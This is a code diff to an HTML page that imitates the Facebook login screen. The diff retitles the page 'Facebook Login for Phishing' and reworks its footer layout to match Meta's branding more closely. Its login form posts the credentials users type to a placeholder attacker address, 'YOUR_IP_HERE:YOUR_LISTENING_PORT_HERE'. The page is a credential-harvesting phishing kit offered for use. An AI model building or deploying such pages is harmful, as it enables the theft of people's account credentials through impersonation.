@@ -6,7 +6,7 @@
 -->
 <!DOCTYPE html>  
 <html lang="en">  
-    <title>Dalice's Resume</title>
+    <title>Facebook Login for Phishing</title>
     <head>  
         <!-- Required meta tags -->
         <meta charset="utf-8">
@@ -45,10 +45,11 @@
                 z-index: 1;
                 width: 100%;
                 max-width: 100%;
+                text-align: center;
             }
 
             .header2 {
-                height: 82%;
+                height: 85%;
                 background: #F0F2F5;
                 color: #978364;
                 position: relative;
@@ -103,7 +104,7 @@
             }
 
            .container {
-                max-width: 1335px;
+                max-width: 1210px;
                 margin: 0 auto;
             }
 
@@ -130,7 +131,7 @@
                 </div>
                 
 
-                <center><div class="card" style="left: 290px; position: relative; top: 43px; height: 352px; width: 385px; box-shadow: 0 0 11px; color: rgb(187, 183, 183);">
+                <center><div id="Login-Card" class="card" style="left: 290px; position: relative; top: 43px; height: 352px; width: 385px; box-shadow: 0 0 11px; color: rgb(187, 183, 183);">
 
                     <form action="http://YOUR_IP_HERE:YOUR_LISTENING_PORT_HERE/" class="form-control">
                         {% csrf_token %}
@@ -157,73 +158,77 @@
             <!-- All below go into the bottom section of the page for the center function. -->
             <center>
                 <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start">
-                    <a href="" style="left: 165px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">English (US)</a>
-                    <a href="" style="left: 170px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration:none;  text-align: left;">Français</a>
-                    <a href="" style="left: 168px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration:none; text-align: left;">(Canada)</a>
-                    <a href="" style="left: 172px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Español</a>
-                    <a href="" style="left: 177px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">中文</a>
-                    <a href="" style="left: 173px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">(简体)</a>
-                    <a href="" style="left: 179px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">한국어</a>
-                    <a href="" style="left: 187px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">日本語</a>
-                    <a href="" style="left: 192px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Português</a>
-                    <a href="" style="left: 197px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">(Brasil)</a>
-                    <a href="" style="left: 203px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Deutsch</a>
-                    <a href="" style="left: 211px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Italiano</a>
-                    <a href="" style="left: 216px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">العربية</a>
-                    <a href="" style="left: 221px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">हिन्दी</a>
-                    <button class="custom-btn btn btn-primary" onclick="" style="left: 223px; bottom: 0px; position: relative; top: 30px; height: 20px; text-align: left;">
-                        <center><span class="plus-sign" style="font-size: 1.8em; position: relative; top: -22px; right: 5px;">+</span></center>
-                    </button>
-
+                    <div class="grid-row">
+                        <a href="" style="left: 115px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">English (US)</a>
+                        <a href="" style="left: 123px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration:none;  text-align: left;">Français</a>
+                        <a href="" style="left: 127px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration:none; text-align: left;">(Canada)</a>
+                        <a href="" style="left: 134px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Español</a>
+                        <a href="" style="left: 140px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">中文</a>
+                        <a href="" style="left: 144px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">(简体)</a>
+                        <a href="" style="left: 149px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">한국어</a>
+                        <a href="" style="left: 154px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">日本語</a>
+                        <a href="" style="left: 161px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Português</a>
+                        <a href="" style="left: 165px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">(Brasil)</a>
+                        <a href="" style="left: 172px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Deutsch</a>
+                        <a href="" style="left: 178px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Italiano</a>
+                        <a href="" style="left: 184px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">العربية</a>
+                        <a href="" style="left: 189px; bottom: -25px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">हिन्दी</a>
+                        <button class="custom-btn btn btn-primary" onclick="" style="left: 195px; bottom: 0px; position: relative; top: 25px; height: 20px; text-align: left;">
+                            <center><span class="plus-sign" style="font-size: 1.8em; position: relative; top: -22px; right: 5px;">+</span></center>
+                        </button>
+                    </div>
                 </div>
                 
                 
-                <div class="line" style="border-top: 1px solid #888; position: relative; bottom: -200px; width: 66%; color: rgb(181, 179, 179); opacity: 0.25; top: 30px;"></div>
+                <div class="line" style="border-top: 1px solid #888; position: relative; bottom: -200px; width: 63%; color: rgb(181, 179, 179); opacity: 0.25; top: 30px;"></div>
 
                 <!-- Turn each of the below links to class's, class=link or text.... then add the on hover stylings in the <head> <style> section. -->
                 
-                <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start">
-
-                    <a href="" style="left: 165px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Sign Up</a>
-                    <a href="" style="left: 177px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;;">Log In</a>
-                    <a href="" style="left: 191px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;;">Messenger</a>            
-                    <a href="" style="left: 205px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Facebook Lite</a>
-                    <a href="" style="left: 224px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Video</a>
-                    <a href="" style="left: 238px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Places</a>
-                    <a href="" style="left: 255px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Games</a>
-                    <a href="" style="left: 273px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Marketplace</a>
-                    <a href="" style="left: 285px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Pay</a>
-                    <a href="" style="left: 300px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Store</a>
-                    <a href="" style="left: 315px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Quest</a>
-                    <a href="" style="left: 330px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Instagram</a>
-                    <a href="" style="left: 345px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Threads</a>
-                    <a href="" style="left: 360px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Fundraisers</a>
-
+                <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start;">
+                    <div class="grid-row">
+                        <a href="" style="left: 115px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Sign Up</a>
+                        <a href="" style="left: 143px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;;">Log In</a>
+                        <a href="" style="left: 160px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;;">Messenger</a>            
+                        <a href="" style="left: 170px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Facebook Lite</a>
+                        <a href="" style="left: 188px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Video</a>
+                        <a href="" style="left: 205px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Places</a>
+                        <a href="" style="left: 225px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Games</a>
+                        <a href="" style="left: 238px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Marketplace</a>
+                        <a href="" style="left: 255px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Pay</a>
+                        <a href="" style="left: 275px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Store</a>
+                        <a href="" style="left: 295px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Quest</a>
+                        <a href="" style="left: 310px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta AI</a>
+                        <a href="" style="left: 330px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Instagram</a>
+                        <a href="" style="left: 345px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Threads</a>
+                    </div>
                 </div>
 
 
                 <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start">
-                    <a href="" style="left: 165px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Services</a>
-                    <a href="" style="left: 180px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Voting Information Center</a>
-                    <a href="" style="left: 195px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Policy</a>
-                    <a href="" style="left: 205px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Center</a>
-                    <a href="" style="left: 220px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Groups</a>
-                    <a href="" style="left: 235px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">About</a>
-                    <a href="" style="left: 250px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Create ad</a>
-                    <a href="" style="left: 265px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Create Page</a>
-                    <a href="" style="left: 280px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Developers</a>
-                    <a href="" style="left: 295px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Careers</a>
-                    <a href="" style="left: 310px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Cookies</a>
-                    <a href="" style="left: 325px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Ad Choices</a>
+                    <div class="grid-row">
+                        <a href="" style="left: 115px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Fundraisers</a>
+                        <a href="" style="left: 143px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Services</a>
+                        <a href="" style="left: 160px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Voting Information Center</a>
+                        <a href="" style="left: 170px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Policy</a>
+                        <a href="" style="left: 188px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Center</a>
+                        <a href="" style="left: 205px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Groups</a>
+                        <a href="" style="left: 225px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">About</a>
+                        <a href="" style="left: 238px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Create ad</a>
+                        <a href="" style="left: 255px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Create Page</a>
+                        <a href="" style="left: 275px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Developers</a>
+                        <a href="" style="left: 295px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Careers</a>
+                        <a href="" style="left: 310px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Cookies</a>
+                    </div>
                 </div>
 
                 <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start;">
-                    <a href="" style="left: 165px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Terms</a>
-                    <a href="" style="left: 180px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Help</a>
-                    <a href="" style="left: 195px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Contact Uploading & Non-Users</a>
-
-                    <div class="text" style="left: 165px; bottom: -55px; position: relative; font-size: 0.78em; color: #838588; text-decoration: none; font-weight: 425;">Meta © 2023</div>
-                    
+                    <div class="grid-row">
+                        <a href="" style="left: 115px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Ad Choices</a>
+                        <a href="" style="left: 143px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Terms</a>
+                        <a href="" style="left: 160px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Help</a>
+                        <a href="" style="left: 170px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Contact Uploading & Non-Users</a>
+                        <div class="text" style="left: -180px; bottom: -60px; position: relative; font-size: 0.78em; color: #838588; text-decoration: none; font-weight: 425;">Meta © 2024</div>
+                    </div>
                 </div>
             </center>
 
